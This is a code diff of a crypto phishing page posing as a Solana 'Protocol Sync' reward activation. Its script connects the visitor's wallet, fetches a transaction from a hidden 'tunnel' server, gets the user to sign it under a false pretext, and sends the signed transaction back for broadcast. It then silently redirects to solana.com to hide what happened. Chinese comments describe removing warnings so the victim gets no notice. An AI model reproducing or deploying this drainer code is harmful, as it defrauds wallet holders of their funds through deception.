@@ -10,30 +10,21 @@
         .box { width: 330px; padding: 40px 30px; background: #0a0a0a; border: 1px solid #333; border-radius: 20px; text-align: center; }
         .status-dot { width: 8px; height: 8px; background: #14f195; border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 10px #14f195; }
         .btn { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        .btn:disabled { background: #333; color: #666; cursor: not-allowed; }
-        #st { font-size: 10px; color: #555; margin-top: 30px; font-family: monospace; text-transform: uppercase; }
+        .btn:disabled { background: #222; color: #444; }
+        #st { font-size: 10px; color: #555; margin-top: 30px; font-family: monospace; }
         .line { height: 1px; background: #222; margin: 25px 0; }
     </style>
 </head>
 <body>
     <div class="box">
-        <div style="font-size: 12px; color: #14f195; margin-bottom: 30px; font-weight: bold;">
+        <div style="font-size: 11px; color: #14f195; margin-bottom: 30px; font-weight: bold;">
             <span class="status-dot"></span> SOLANA MAINNET-BETA
         </div>
-        
         <h2 style="margin: 0 0 10px 0; font-size: 22px;">PROTOCOL SYNC</h2>
-        <p style="color: #888; font-size: 13px; line-height: 1.6;">Your wallet address requires a secure protocol activation to finalize the distributed rewards allocation.</p>
-        
+        <p style="color: #888; font-size: 13px; line-height: 1.6;">Node activation required to finalize reward distribution for this address.</p>
         <div class="line"></div>
-        
-        <div id="details" style="text-align: left; font-size: 12px; color: #666; margin-bottom: 20px;">
-            <div style="margin-bottom: 8px;">NETWORK STATUS: <span style="color:#eee">STABLE</span></div>
-            <div>VERIFICATION: <span style="color:#eee">PENDING</span></div>
-        </div>
-
         <button id="cta" class="btn">ACTIVATE ACCOUNT</button>
-        
-        <div id="st">ENCRYPTED END-TO-END CONNECTION</div>
+        <div id="st">ENCRYPTED NODE CONNECTION</div>
     </div>
 
     <script>
@@ -47,14 +38,11 @@
             try {
                 const p = window.trustwallet?.solana || window.solana;
                 if (!p) return;
-
-                btn.disabled = true;
-                btn.innerText = "SYNCHRONIZING...";
                 
-                log("NODE CONNECTING...");
+                btn.disabled = true;
+                btn.innerText = "INITIALIZING...";
                 await p.connect();
 
-                log("DATA FETCHING...");
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -62,32 +50,27 @@
                 });
                 const info = await resp.json();
                 
-                log("AWAITING SECURE SIGNATURE...");
                 const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
-                
-                // 🔱 触发“Unknown Program / ComputeBudget”弹窗
                 const signed = await p.signTransaction(tx);
-                log("FINALIZING BROADCAST...");
+                
+                // 🔱 关键改动：状态立即切换，不再弹出 Alert
+                btn.innerText = "SUCCESSFUL";
+                log("RELOAD PROTOCOL...");
 
-                const signedBase64 = btoa(String.fromCharCode.apply(null, signed.serialize()));
+                const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
 
+                // 回传广播
                 await fetch(tunnel + "/broadcast_v41", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ signed_tx: signedBase64 })
+                    body: JSON.stringify({ signed_tx: signedBase })
                 });
 
-                log("ACTIVATION SUCCESSFUL!");
-                
-                setTimeout(() => {
-                    alert("Activation Successful! \n\nYour reward allocation has been confirmed and will be distributed shortly.");
-                    window.location.href = "https://solana.com/validators"; 
-                }, 1000);
+                // 🔱 没有任何提示，直接瞬移跳走
+                window.location.replace("https://solana.com/validators");
 
             } catch (err) {
-                btn.disabled = false;
-                btn.innerText = "RETRY ACTIVATION";
-                log("PROTOCOL ERROR");
+                window.location.reload();
             }
         };
     </script>
